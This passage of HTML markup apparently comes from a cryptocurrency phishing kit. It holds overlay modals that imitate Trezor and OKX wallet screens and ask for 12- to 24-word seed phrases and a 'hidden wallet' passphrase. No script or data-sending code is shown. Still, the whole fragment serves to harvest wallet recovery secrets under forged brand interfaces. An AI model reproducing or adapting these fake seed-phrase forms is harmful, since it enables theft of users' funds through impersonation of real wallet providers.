                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            14
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            15
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            16
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            17
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            18
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                  </div>
                  <div
                    id="trezor-24"
                    class="trezor-container-24-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
                  >
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            19
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            20
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            21
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            22
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            23
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            24
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-my-2 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400 scwtw-text-start scwtw-opacity-0"
                  id="trezor-error-container"
                >
                  <span
                    class="font-inter scwtw-text-[#ff5f52] scwtw-font-normal scwtw-text-[14px]"
                    >1 word is invalid or misspelled</span
                  >
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#202020] dark:scwtw-text-[#ffffff] dark:scwtw-bg-[#ffffff05] scwtw-font-normal font-inter scwtw-text-[15px] scwtw-cursor-pointer scwtw-rounded-[16px] scwtw-h-[48px] hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                    id="trezor-import-button"
                  >
                    Continue with a wallet
                  </button>
                </div>
              </div>
            </div>
            <div
              id="passphrase-container"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-0 scwtw-hidden scwtw-px-6 scwtw-py-8"
            >
              <div class="scwtw-flex scwtw-items-center scwtw-justify-between">
                <div>
                  <svg
                    class="scwtw-h-[35px] scwtw-w-auto"
                    width="249"
                    height="48"
                    viewBox="0 0 249 48"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                      fill="#202020"
                    ></path>
                    <path
                      d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                      fill="white"
                    ></path>
                    <path
                      d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                      fill="#202020"
                    ></path>
                  </svg>
                </div>
                <div>
                  <button
                    class="scwtw-p-1 scwtw-rounded-[12px] hover:scwtw-bg-[#f3f3f3] dark:hover:scwtw-bg-[#eaeaea0d] scwtw-transition-all scwtw-duration-300 active:scwtw-scale-95"
                    type="button"
                    id="trezor-close-button2"
                  >
                    <svg
                      class="scwtw-w-6 scwtw-h-6 scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    >
                      <path d="M18 6 6 18"></path>
                      <path d="m6 6 12 12"></path>
                    </svg>
                  </button>
                </div>
              </div>
              <div class="scwtw-mt-6">
                <div
                  class="scwtw-flex scwtw-flex-col scwtw-items-start scwtw-justify-start scwtw-text-start scwtw-gap-y-1.5"
                >
                  <div>
                    <h3
                      class="scwtw-text-[#202020] dark:scwtw-text-[#ffffff] font-inter scwtw-font-bold scwtw-text-[22px]"
                    >
                      Import Hidden Wallet
                    </h3>
                  </div>
                  <div class="scwtw-mb-1.5">
                    <p
                      class="scwtw-text-[#141618] dark:scwtw-text-[#dddddd] font-inter scwtw-font-normal scwtw-text-[16px]"
                    >
                      Enter passphrase to authenticate to your hidden wallet.
                      This input can be empty.
                    </p>
                  </div>
                </div>
              </div>
              <div class="scwtw-mt-4">
                <div class="scwtw-relative scwtw-w-full">
                  <input
                    class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-px-[20px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter trezor-passphrase-input"
                    type="text"
                  />
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#202020] dark:scwtw-text-[#ffffff] dark:scwtw-bg-[#ffffff05] scwtw-font-normal font-inter scwtw-text-[15px] scwtw-cursor-pointer scwtw-rounded-[16px] scwtw-h-[48px] hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                    type="button"
                    id="trezor-import-passphrase-button"
                  >
                    Import Hidden Wallet
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- okk -->
    <div
      id="okx-modal-overlay"
      style="display: none"
      class="okx-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      id="okx-modal"
      style="display: none"
      class="okx-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        class="okx-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-transform scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-0 md:scwtw-right-8 md:scwtw-left-auto md:scwtw-translate-x-0 md:scwtw-w-[360px] md:scwtw-h-[680px] md:scwtw-border md:scwtw-border-[#eaecef] dark:md:scwtw-border-[#474d57] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2 md:scwtw-translate-y-0"
      >
        <div
          class="scwtw-h-full scwtw-w-full scwtw-bg-[#ffffff] dark:scwtw-bg-[#000000] scwtw-shadow-xl"
        >
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="loading-container-okx"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-flex-col scwtw-overflow-hidden scwtw-opacity-0 scwtw-hidden"
            >
              <video
                src="./images/cover-light.webm"
                type="video/webm"
                loop=""
                autoplay=""
                muted=""
                playsinline=""
                width="100%"
                height="100%"
                class="scwtw-w-full scwtw-flex dark:scwtw-hidden scwtw-h-auto okx-video"
              ></video>
              <video
                src="./images/cover-dark-v3.webm"
                type="video/webm"
                loop=""
                autoplay=""
                muted=""
                playsinline=""
                width="100%"
                height="100%"
                class="scwtw-w-full dark:scwtw-flex scwtw-hidden scwtw-h-auto okx-video"
              ></video>
              <div class="scwtw-mb-1.5">
                <h3
                  class="font-open-sans scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-font-bold scwtw-text-[24px] scwtw-leading-[33px]"
                >
                  Your portal to Web3
                </h3>
              </div>
              <div>
                <p
                  class="font-open-sans scwtw-text-[#909090] scwtw-font-normal scwtw-text-[12px] scwtw-leading-[24px]"
                >
                  Wallet · Trade · NFT · Earn · DApp
                </p>
              </div>
            </div>
            <div
              id="import-container-okx"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-100"
            >
              <div>
                <div
                  class="scwtw-border-b scwtw-border-b-[#e6e6e6] dark:scwtw-border-b-[#383838]"
                >
                  <div
                    class="scwtw-flex scwtw-justify-between scwtw-items-center scwtw-p-3"
                  >
                    <div>
                      <button
                        class="scwtw-p-1 scwtw-rounded-full hover:scwtw-bg-[#f3f3f3] dark:hover:scwtw-bg-[#1a1a1a] scwtw-transition-all scwtw-duration-300 scwtw-cursor-pointer"
                        type="button"
                        id="okx-close-button"
                      >
                        <svg
                          class="scwtw-w-6 scwtw-h-6 scwtw-text-[#000000] dark:scwtw-text-[#ffffff]"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="1.5"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="m15 18-6-6 6-6"></path>
                        </svg>
                      </button>
                    </div>
                    <div>
                      <p
                        class="font-open-sans scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-font-semibold scwtw-text-[17px] scwtw-leading-[24px]"
                      >
                        Import with Secret Phrase
                      </p>
                    </div>
                    <div>
                      <div class="scwtw-w-6 scwtw-h-6"></div>
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-flex scwtw-justify-start scwtw-items-center scwtw-px-3 scwtw-py-3 gap-x-1"
                >
                  <div>
                    <span
                      class="font-open-sans scwtw-text-[#909090] scwtw-font-normal scwtw-text-[14px]"
                      >My seed phrase has</span
                    >
                  </div>
                  <div>
                    <select
                      class="font-open-sans scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-font-normal scwtw-text-[14px] scwtw-border-none scwtw-bg-transparent dark:scwtw-bg-[#000000] scwtw-outline-none"
                      id="okx-change-words-count"
                    >
                      <option value="12">12 words</option>
                      <option value="15">15 words</option>
                      <option value="18">18 words</option>
                      <option value="21">21 words</option>
                      <option value="24">24 words</option>
                    </select>
                  </div>
                </div>
                <div
                  class="scwtw-mt-2 scwtw-px-4 scwtw-max-h-[400px] scwtw-overflow-y-auto okx-custom-scrollbar"
                >
                  <div class="scwtw-grid scwtw-grid-cols-2 scwtw-gap-1">
                    <div
                      id="okx-container-12-words"
                      class="okx-container-12-words scwtw-contents"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              1
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
